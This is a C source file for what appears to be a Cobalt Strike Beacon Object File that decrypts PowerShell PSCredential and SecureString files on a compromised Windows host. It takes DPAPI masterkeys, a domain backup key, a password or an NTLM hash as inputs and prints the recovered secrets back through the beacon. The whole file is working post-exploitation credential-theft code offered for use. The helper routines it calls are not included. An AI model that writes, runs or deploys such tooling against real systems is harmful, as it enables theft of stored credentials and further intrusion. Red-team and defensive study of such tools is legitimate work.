/*
 * ps.c — BOF for PowerShell SecureString / PSCredential decryption
 *
 * Usage:
 *   ps /target:FILE [/pvk:BASE64] [/password:PASS] [/ntlm:HASH]
 *      [/credkey:KEY] [/unprotect] [/rpc]
 *
 * Decrypts PowerShell Export-Clixml PSCredential files and
 * ConvertFrom-SecureString output using DPAPI.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* target_str = BeaconDataExtract(&parser, NULL);
    char* pvk_b64    = BeaconDataExtract(&parser, NULL);
    char* password   = BeaconDataExtract(&parser, NULL);
    char* ntlm       = BeaconDataExtract(&parser, NULL);
    char* credkey    = BeaconDataExtract(&parser, NULL);
    int   unprotect  = BeaconDataInt(&parser);
    int   use_rpc    = BeaconDataInt(&parser);

    if (!target_str || strlen(target_str) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Usage: ps /target:CRED_FILE [/pvk:BASE64] [/password:PASS] "
            "[/ntlm:HASH] [/credkey:KEY] [/unprotect] [/rpc]\n");
        return;
    }

    wchar_t* target = utf8_to_wide(target_str);
    if (!target) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to convert target path\n");
        return;
    }

    BYTE* pvk = NULL;
    int pvk_len = 0;
    if (pvk_b64 && strlen(pvk_b64) > 0)
        pvk = base64_decode(pvk_b64, &pvk_len);

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Pre-load keys */
    if (credkey && strlen(credkey) > 0) {
        char* ck = (char*)intAlloc(strlen(credkey) + 1);
        if (ck) {
            strcpy(ck, credkey);
            char* pair = strtok(ck, ",");
            while (pair) {
                char* colon = strchr(pair, ':');
                if (colon) {
                    *colon = 0;
                    GUID guid;
                    if (string_to_guid(pair, &guid)) {
                        int sha1_len = 0;
                        BYTE* sha1 = hex_to_bytes(colon + 1, &sha1_len);
                        if (sha1 && sha1_len == 20) mk_cache_add(&cache, &guid, sha1);
                        if (sha1) intFree(sha1);
                    }
                }
                pair = strtok(NULL, ",");
            }
            intFree(ck);
        }
    }

    /* Triage masterkeys if pvk/password/ntlm/rpc provided */
    if (pvk || use_rpc ||
        (password && strlen(password) > 0) ||
        (ntlm && strlen(ntlm) > 0)) {
        triage_user_masterkeys(&cache, pvk, pvk_len,
            (password && strlen(password) > 0) ? password : NULL,
            (ntlm && strlen(ntlm) > 0) ? ntlm : NULL,
            NULL, (BOOL)use_rpc, NULL, NULL, FALSE, NULL);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI PSCredential (BOF) ===\n");

    triage_ps_cred_file(&cache, target, (BOOL)unprotect);

    mk_cache_free(&cache);
    if (pvk) intFree(pvk);
    intFree(target);
}
